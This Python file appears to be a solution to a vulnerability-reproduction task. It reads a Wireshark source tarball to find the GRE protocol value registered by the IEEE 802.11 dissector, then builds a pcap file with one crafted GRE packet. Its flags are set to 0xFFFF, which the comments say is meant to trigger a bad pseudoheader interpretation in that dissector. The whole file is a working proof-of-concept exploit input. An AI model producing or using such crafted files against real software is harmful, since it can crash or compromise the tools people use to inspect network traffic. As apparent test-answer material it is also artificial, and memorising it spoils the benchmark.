import tarfile
import re
import struct

class Solution:
    def calculate_ip_checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xFFFF)
        s += (s >> 16)
        return (~s) & 0xFFFF

    def solve(self, src_path: str) -> bytes:
        # Default fallback value for ETHERTYPE_IEEE_802_11 (commonly 0x88BB or similar in Wireshark)
        gre_proto_val = 0x88bb 
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                c_content = None
                h_content = None
                
                # Scan for relevant files to extract protocol constant
                for member in tar.getmembers():
                    if member.name.endswith('packet-ieee80211.c'):
                        f = tar.extractfile(member)
                        if f:
                            c_content = f.read().decode('utf-8', errors='ignore')
                    elif member.name.endswith('/etypes.h') or member.name == 'etypes.h':
                        f = tar.extractfile(member)
                        if f:
                            h_content = f.read().decode('utf-8', errors='ignore')
                            
                    if c_content and h_content:
                        break 
                
                if c_content:
                    # Look for registration in gre.proto
                    # Pattern: dissector_add_uint("gre.proto", CONSTANT, handle);
                    pattern = r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+|0x[0-9a-fA-F]+|\d+)'
                    m = re.search(pattern, c_content)
                    if m:
                        val_token = m.group(1).strip()
                        if val_token.startswith('0x') or val_token.isdigit():
                            gre_proto_val = int(val_token, 0)
                        else:
                            # It is a define constant, resolve it
                            # Helper to clean value string (remove parens, comments)
                            def clean_val(v):
                                return v.split('/')[0].strip().replace('(', '').replace(')', '')

                            # Search in C file
                            def_pattern = r'#define\s+' + re.escape(val_token) + r'\s+([^\n]+)'
                            m_def = re.search(def_pattern, c_content)
                            if m_def:
                                gre_proto_val = int(clean_val(m_def.group(1)), 0)
                            elif h_content:
                                # Search in Header file
                                m_def_h = re.search(def_pattern, h_content)
                                if m_def_h:
                                    gre_proto_val = int(clean_val(m_def_h.group(1)), 0)
        except Exception:
            # Fallback to default if extraction fails
            pass

        # Construct PCAP file
        # Global Header: 24 bytes, LinkType 1 (Ethernet)
        # Magic(LE), Ver(2.4), Zone, Sig, SnapLen, LinkType
        pcap_hdr = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
        
        # Construct Packet Data
        # Ethernet Header (14 bytes): [Dst 6] [Src 6] [Type 2]
        # Type 0x0800 = IPv4
        eth = b'\xff\xff\xff\xff\xff\xff' + b'\x00\x00\x00\x00\x00\x00' + b'\x08\x00'
        
        # IP Header (20 bytes min)
        # Protocol 47 = GRE
        # Total Length = 20 (IP) + 4 (GRE) + 1 (Payload) = 25
        ip_len = 20 + 4 + 1
        # 45 00 LEN ID Flags/Frag TTL Proto Cks Src Dst
        ip_params = [0x45, 0x00, ip_len, 0x1337, 0x0000, 64, 47, 0, 0x7f000001, 0x7f000001]
        ip_header_temp = struct.pack('>BBHHHBBHII', *ip_params)
        
        # Calculate Checksum
        checksum = self.calculate_ip_checksum(ip_header_temp)
        ip_params[7] = checksum
        ip_header = struct.pack('>BBHHHBBHII', *ip_params)
        
        # GRE Header (4 bytes)
        # Flags/Ver (2 bytes): 0xFFFF (Non-zero to trigger bad pseudoheader interpretation)
        # Protocol (2 bytes): gre_proto_val (triggers 802.11 dissector)
        gre_header = struct.pack('>HH', 0xFFFF, gre_proto_val)
        
        # Payload (1 byte)
        payload = b'\x00'
        
        packet_data = eth + ip_header + gre_header + payload
        
        # Packet Header (16 bytes)
        # TsSec, TsUsec, InclLen, OrigLen
        pkt_hdr = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
        
        return pcap_hdr + pkt_hdr + packet_data